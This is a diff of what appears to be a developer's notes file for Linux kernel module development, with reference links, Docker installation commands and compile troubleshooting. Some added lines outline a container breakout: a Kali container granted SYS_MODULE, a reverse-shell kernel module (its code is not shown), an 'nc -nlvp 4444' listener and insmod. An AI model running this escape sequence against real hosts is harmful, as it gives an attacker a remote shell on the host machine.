@@ -25,6 +25,7 @@ https://github.com/Techogenius/Linux-device-driver-code/tree/master
 https://faun.pub/building-the-simple-kernel-module-from-linux-device-drivers-on-arch-linux-9a8374a502a3
 https://devarea.com/linux-kernel-development-and-writing-a-simple-kernel-module/
 https://blog.sourcerer.io/writing-a-simple-linux-kernel-module-d9dc3762c234
+https://www.oreilly.com/library/view/linux-device-drivers/0596005903/ch02.html
 
 https://www.kernel.org/doc/html/v4.10/process/coding-style.html
 https://kworkflow.org/tutorials/codestyle.html
@@ -63,8 +64,71 @@ https://projectatomic.io/blog/2018/06/building-kernel-modules-with-podman/
 https://www.baeldung.com/linux/docker-container-kernel-modules
 https://github.com/djs55/docker-desktop-example-kernel-module
 https://mgalgs.io/2021/03/23/how-to-build-a-custom-linux-kernel-for-qemu-using-docker.html
+https://xcellerator.github.io/posts/docker_escape/
+https://github.com/xcellerator/linux_kernel_hacking/tree/079d97b8e0b25e437ea4d5aa2fa4e85feff67583
+https://iximiuz.com/en/posts/from-docker-container-to-bootable-linux-disk-image/
+https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd
+https://stackoverflow.com/questions/33013539/docker-loading-kernel-modules
+https://www.rancher.com/docs/os/v1.2/en/configuration/kernel-modules-kernel-headers/
+https://www.reddit.com/r/LiveOverflow/comments/ugbjvf/unable_to_execute_insmod_on_docker_container/
+https://medium.com/@xUr00U/docker-container-breakout-part-1-d364fede4209
+
 
 https://askubuntu.com/questions/1500017/ubuntu-22-04-default-gcc-version-does-not-match-version-that-built-latest-defaul
+https://stackoverflow.com/questions/16360689/invalid-parameters-error-when-trying-to-insert-module-that-accesses-exported-s
+https://askubuntu.com/questions/1150155/unknown-symbol-in-module-but-what-symbol
+https://stackoverflow.com/questions/16360689/invalid-parameters-error-when-trying-to-insert-module-that-accesses-exported-s
+https://discussion.fedoraproject.org/t/insmod-permission-error-when-being-ran-from-systemd-service/74145/4
+https://stackoverflow.com/questions/67525731/error-unknown-symbol-copy-to-user-during-module-load
+https://slavamoskvin.com/finding-bugs-in-kernel.-part-1-crashing-a-vulnerable-driver-with-syzkaller/
+https://community.intel.com/t5/Nios-V-II-Embedded-Design-Suite/MODPOST-copy-from-user-module-compilation-issue/td-p/73584
+
+
+
+
+sudo docker run -it --privileged --hostname docker ubuntu
+
+sudo docker run -it --privileged --hostname docker --mount "type=bind,src=$PWD,dst=/root" ubuntu
+
+sudo docker run -it --privileged --hostname docker ubuntu
+exit
+sudo docker run --rm -it --privileged example:1 bash
+cat /proc/kallsyms | grep copy_to_user
+--cap-add SYS_MODULE
+--cap-add=ALL
+
+sudo apt install --reinstall gcc-12
+sudo apt install libmodule-info-perl
+
+
+sudo docker pull docker.io/kalilinux/kali-rolling
+sudo docker image ls
+  kali: 729006db3366
+sudo docker run --cap-add SYS_MODULE -it --name breakout  729006db3366 /bin/bash
+apt update -y && apt install \
+	gcc -y && apt install nano -y && apt-get install libcap2-bin -y && \
+	apt install make -y && apt install net-tools -y 
+capsh --print
+  cap_sys_module
+nano reverse-shell.c
+  code
+ifconfig
+apt-get install linux-headers-$(uname -r)
+find / -name kmod.h 2>/dev/null
+nano Makefile
+  code
+make
+nc -nlvp 4444
+insmod reverse-shell.ko
+
+
+******************
+
+https://xcellerator.github.io/posts/docker_escape/
+https://github.com/xcellerator/linux_kernel_hacking/tree/079d97b8e0b25e437ea4d5aa2fa4e85feff67583/3_RootkitTechniques/3.8_privileged_container_escaping
+https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd
+https://www.reddit.com/r/LiveOverflow/comments/ugbjvf/unable_to_execute_insmod_on_docker_container/
+https://medium.com/@xUr00U/docker-container-breakout-part-1-d364fede4209
 
 
 sudo apt-get install \
@@ -86,10 +150,26 @@ make test
 sudo su
 echo Test0 >/dev/example_dev
 cat /dev/example_dev
+exit
 
+From Host:
+sudo ./script_docker.sh
 
-sudo apt install --reinstall gcc-12
+sudo apt update && sudo apt upgrade -y
+sudo apt install -y ca-certificates curl gnupg
+curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
+echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
+sudo apt update
+sudo apt install -y docker-ce docker-ce-cli containerd.io
+sudo usermod -aG docker $USER
+sudo curl -L "https://github.com/docker/compose/releases/download/$(curl -s https://api.github.com/repos/docker/compose/releases/latest | grep 'tag_name' | cut -d'"' -f4)/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
+sudo chmod +x /usr/local/bin/docker-compose
+docker-compose --version
+sudo systemctl enable docker
 
-sudo apt install libmodule-info-perl
+sudo docker build . -t example:1
+sudo docker run --rm -it --cap-add SYS_MODULE --privileged example:1
+
+******************
 
 */
